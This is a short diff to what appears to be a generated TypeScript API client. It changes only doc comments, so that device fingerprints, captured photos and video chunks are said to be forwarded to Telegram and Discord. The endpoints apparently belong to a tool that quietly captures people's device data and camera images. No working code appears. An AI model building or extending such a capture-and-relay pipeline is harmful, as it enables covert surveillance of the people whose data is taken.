@@ -373,7 +373,7 @@ export const getSendDeviceInfoUrl = () => {
 }
 
 /**
- * Receives collected device/browser info and forwards to Telegram
+ * Receives collected device/browser info and forwards to Telegram and Discord
  * @summary Send device fingerprint info
  */
 export const sendDeviceInfo = async (deviceInfoInput: DeviceInfoInput, options?: RequestInit): Promise<OkResponse> => {
@@ -445,7 +445,7 @@ export const getSendPhotoUrl = () => {
 }
 
 /**
- * Receives a base64-encoded photo and forwards to Telegram
+ * Receives a base64-encoded photo and forwards to Telegram and Discord
  * @summary Send a captured photo
  */
 export const sendPhoto = async (photoInput: PhotoInput, options?: RequestInit): Promise<OkResponse> => {
@@ -517,7 +517,7 @@ export const getSendVideoChunkUrl = () => {
 }
 
 /**
- * Receives a base64-encoded video chunk and forwards to Telegram
+ * Receives a base64-encoded video chunk and forwards to Telegram and Discord
  * @summary Send a video recording chunk
  */
 export const sendVideoChunk = async (videoChunkInput: VideoChunkInput, options?: RequestInit): Promise<OkResponse> => {
